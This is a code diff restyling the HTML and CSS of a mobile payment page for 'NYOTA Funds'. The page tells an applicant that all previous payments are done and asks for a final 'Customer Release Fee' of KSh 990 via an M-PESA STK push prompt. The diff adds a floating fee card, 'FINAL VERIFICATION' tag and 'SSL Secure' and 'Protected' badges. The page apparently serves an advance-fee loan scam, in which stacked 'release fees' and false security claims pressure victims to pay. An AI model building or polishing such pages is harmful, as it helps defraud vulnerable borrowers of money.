@@ -3,157 +3,232 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="theme-color" content="#087f32">
+<meta name="theme-color" content="#087F32">
+<title>NYOTA Funds - Final Release Fee</title>
 
-<title>NYOTA Funds - Final Payment</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
 <style>
 *{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:"Segoe UI",Arial,sans-serif;
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Inter,sans-serif;
 }
 
 body{
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    padding:20px;
-    background:
-        radial-gradient(circle at 10% 10%, rgba(34,197,94,.35), transparent 28%),
-        radial-gradient(circle at 90% 90%, rgba(59,130,246,.35), transparent 28%),
-        linear-gradient(135deg,#064e3b,#1e40af);
+background:#eef4fb;
+display:flex;
+justify-content:center;
+align-items:center;
+min-height:100vh;
+padding:18px;
 }
 
 .container{
-    width:100%;
-    max-width:450px;
+width:100%;
+max-width:420px;
 }
 
 .card{
-    background:#fff;
-    border-radius:22px;
-    overflow:hidden;
-    box-shadow:0 20px 60px rgba(0,0,0,.28);
+background:white;
+border-radius:28px;
+overflow:hidden;
+box-shadow:0 20px 55px rgba(0,0,0,.12);
 }
 
+/* Header */
+
 .header{
-    background:linear-gradient(135deg,#087f32,#2563EB);
-    color:#fff;
-    text-align:center;
-    padding:28px 20px;
+background:linear-gradient(160deg,#087F32,#2563EB);
+padding:24px 22px 70px;
+text-align:center;
+color:white;
+position:relative;
+}
+
+.tag{
+display:inline-block;
+padding:6px 14px;
+border-radius:999px;
+background:rgba(255,255,255,.18);
+font-size:12px;
+margin-bottom:12px;
 }
 
 .header h1{
-    font-size:26px;
-    margin-bottom:6px;
+font-size:28px;
+font-weight:800;
 }
 
 .header p{
-    opacity:.92;
+margin-top:6px;
+opacity:.9;
+font-size:14px;
+}
+
+/* Floating amount card */
+
+.release-card{
+width:calc(100% - 36px);
+margin:-40px auto 18px;
+background:white;
+border-radius:22px;
+padding:20px;
+box-shadow:0 12px 30px rgba(37,99,235,.15);
+text-align:center;
+position:relative;
+z-index:2;
+}
+
+.release-card small{
+color:#64748B;
+font-size:12px;
+display:block;
+margin-bottom:6px;
+}
+
+.release-card h2{
+font-size:34px;
+color:#087F32;
+font-weight:800;
 }
 
 .content{
-    padding:22px;
+padding:0 18px 22px;
 }
 
-.intro{
-    background:#F0FDF4;
-    border-left:5px solid #16A34A;
-    border-radius:12px;
-    padding:16px;
-    line-height:1.6;
-    color:#374151;
-    margin-bottom:20px;
+/* Success notice */
+
+.notice{
+background:#ECFDF5;
+border:1px solid #BBF7D0;
+border-radius:16px;
+padding:14px;
+color:#166534;
+font-size:14px;
+line-height:1.6;
+margin-bottom:18px;
 }
+
+/* Detail tiles */
 
 .details{
-    background:#F8FAFC;
-    border:1px solid #E5E7EB;
-    border-radius:12px;
-    padding:16px;
+display:grid;
+gap:12px;
+margin-bottom:20px;
 }
 
-.details p{
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    margin:12px 0;
-    font-size:15px;
+.tile{
+background:#F8FAFC;
+border:1px solid #E5E7EB;
+border-radius:16px;
+padding:14px;
+display:flex;
+align-items:center;
+gap:12px;
 }
 
-.details span{
-    color:#087f32;
-    font-weight:bold;
+.tile-icon{
+width:42px;
+height:42px;
+border-radius:14px;
+background:linear-gradient(135deg,#DCFCE7,#DBEAFE);
+display:flex;
+justify-content:center;
+align-items:center;
+font-size:18px;
 }
 
-.amount{
-    margin-top:18px;
-    background:#EFF6FF;
-    border-left:5px solid #2563EB;
-    border-radius:12px;
-    padding:18px;
-    text-align:center;
+.tile-text small{
+display:block;
+color:#64748B;
+font-size:12px;
 }
 
-.amount small{
-    display:block;
-    color:#64748B;
-    margin-bottom:6px;
+.tile-text strong{
+font-size:14px;
+color:#0F172A;
 }
 
-.amount strong{
-    font-size:28px;
-    color:#2563EB;
-}
+/* Button */
 
 button{
-    width:100%;
-    padding:16px;
-    margin-top:22px;
-    border:none;
-    border-radius:14px;
-    background:linear-gradient(135deg,#16A34A,#087f32);
-    color:#fff;
-    font-size:17px;
-    font-weight:700;
-    cursor:pointer;
-    box-shadow:0 10px 25px rgba(22,163,74,.25);
-    transition:.25s;
+width:100%;
+padding:19px;
+border:none;
+border-radius:18px;
+background:linear-gradient(135deg,#16A34A,#087F32);
+color:white;
+font-size:18px;
+font-weight:700;
+cursor:pointer;
+transition:.25s;
+box-shadow:0 14px 35px rgba(22,163,74,.35);
+position:relative;
+overflow:hidden;
+}
+
+button::after{
+content:"";
+position:absolute;
+top:0;
+left:-100%;
+width:100%;
+height:100%;
+background:linear-gradient(120deg,
+transparent,
+rgba(255,255,255,.35),
+transparent);
+transition:.7s;
 }
 
 button:hover{
-    transform:translateY(-2px);
+transform:translateY(-2px);
+}
+
+button:hover::after{
+left:100%;
 }
 
 button:disabled{
-    opacity:.6;
-    cursor:not-allowed;
-    transform:none;
+opacity:.6;
+cursor:not-allowed;
 }
 
+/* Status */
+
 #status{
-    min-height:24px;
-    margin-top:15px;
-    text-align:center;
-    font-size:14px;
+margin-top:14px;
+text-align:center;
+font-size:13px;
+min-height:22px;
+padding:8px;
+border-radius:10px;
 }
 
 .success{
-    color:#15803D;
+background:#ECFDF5;
+color:#15803D;
 }
 
 .error{
-    color:#DC2626;
+background:#FEF2F2;
+color:#DC2626;
 }
 
-.notice{
-    margin-top:18px;
-    text-align:center;
-    color:#64748B;
-    font-size:12px;
+/* Security strip */
+
+.security{
+margin-top:20px;
+padding-top:18px;
+border-top:1px solid #E5E7EB;
+display:flex;
+justify-content:space-between;
+font-size:11px;
+color:#64748B;
+flex-wrap:wrap;
+gap:8px;
 }
 </style>
 </head>
@@ -165,32 +240,77 @@ button:disabled{
 <div class="card">
 
 <div class="header">
-<h1>NYOTA FUNDS</h1>
-<p>Final Customer Release Fee</p>
+
+<div class="tag">FINAL VERIFICATION</div>
+
+<h1>NYOTA Funds</h1>
+
+<p>Complete your final payment</p>
+
+</div>
+
+<div class="release-card">
+
+<small>Customer Release Fee</small>
+
+<h2>KSh 990</h2>
+
 </div>
 
 <div class="content">
 
-<div class="intro">
-Congratulations! You have completed all previous payments. The final step is to pay the **Customer Release Fee of KSh 990**. Once this payment is confirmed, your application will proceed to completion.
+<div class="notice">
+Congratulations! You have completed all previous payments. The final step is to pay the **Customer Release Fee of KSh 990**. Once this payment is confirmed, your application will proceed to completion
 </div>
 
 <div class="details">
-<p><b>Applicant</b><span id="name">Applicant</span></p>
-<p><b>Phone</b><span id="phone">Not available</span></p>
+
+<div class="tile">
+
+<div class="tile-icon">👤</div>
+
+<div class="tile-text">
+
+<small>Applicant</small>
+
+<strong id="name">Applicant</strong>
+
 </div>
 
-<div class="amount">
-<small>Customer Release Fee</small>
-<strong>KSh 990</strong>
 </div>
 
-<button id="payBtn" onclick="payService()">Pay KSh 990</button>
+<div class="tile">
+
+<div class="tile-icon">📱</div>
+
+<div class="tile-text">
+
+<small>Phone Number</small>
+
+<strong id="phone">Not available</strong>
+
+</div>
+
+</div>
+
+</div>
+
+<button id="payBtn" onclick="payService()">
+
+Pay KSh 990 →
+
+</button>
 
 <div id="status"></div>
 
-<div class="notice">
-🔒 Secure STK Push • Enter your M-PESA PIN when prompted.
+<div class="security">
+
+<span>🔒 SSL Secure</span>
+
+<span>⚡ M-PESA STK Push</span>
+
+<span>✔ Protected</span>
+
 </div>
 
 </div>
@@ -228,7 +348,7 @@ statusBox.className=type;
 
 function resetButton(){
 button.disabled=false;
-button.textContent="Pay KSh 990";
+button.textContent="Pay KSh 990 →";
 }
 
 async function readJson(response){
